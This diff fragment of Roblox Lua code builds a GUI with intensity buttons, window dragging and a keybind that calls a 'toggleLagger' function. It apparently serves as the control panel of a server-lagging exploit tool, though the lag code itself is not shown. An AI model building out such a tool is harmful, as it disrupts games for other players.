+    Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 5)
+    btnMid.MouseButton1Click:Connect(function()
+        nivelActual = "Mid"
+        actualizarBotonesNivel()
+        SaveConfig()
+    end)
+    aplicarEfectoHover(btnMid)
+
+    btnHigh = Instance.new("TextButton", mainFrame)
+    btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
+    btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
+    btnHigh.Font = UI_CONFIG.Font
+    btnHigh.Text = "HIGH"
+    btnHigh.TextColor3 = Color3.fromRGB(0,0,0)
+    btnHigh.TextSize = 10
+    btnHigh.AutoButtonColor = false
+    btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
+    btnHigh.BorderSizePixel = 1
+    btnHigh.BorderColor3 = UI_CONFIG.BorderColor
+    btnHigh.ZIndex = 7
+    Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 5)
+    btnHigh.MouseButton1Click:Connect(function()
+        nivelActual = "High"
+        actualizarBotonesNivel()
+        SaveConfig()
+    end)
+    aplicarEfectoHover(btnHigh)
+
+    actualizarBotonesNivel()
+    actualizarSwitch()
+
+    -- ARRASTRAR
+    local isDragging, dragStart, startPos = false, nil, nil
+    mainFrame.InputBegan:Connect(function(input)
+        if ventanaBloqueada then return end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            isDragging = true
+            dragStart = input.Position
+            startPos = mainFrame.Position
+        end
+    end)
+    
+    UserInputService.InputChanged:Connect(function(input)
+        if not isDragging or ventanaBloqueada then return end
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            local delta = input.Position - dragStart
+            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    mainFrame.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            isDragging = false
+        end
+    end)
+
+    -- ACTIVACIÓN
+    UserInputService.InputBegan:Connect(function(input, gp)
+        if gp then return end
+        if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
+            toggleLagger()
+        end
+    end)
+end
+
+-- 🚀 ЗАПУСК GUI
+createMainUI()
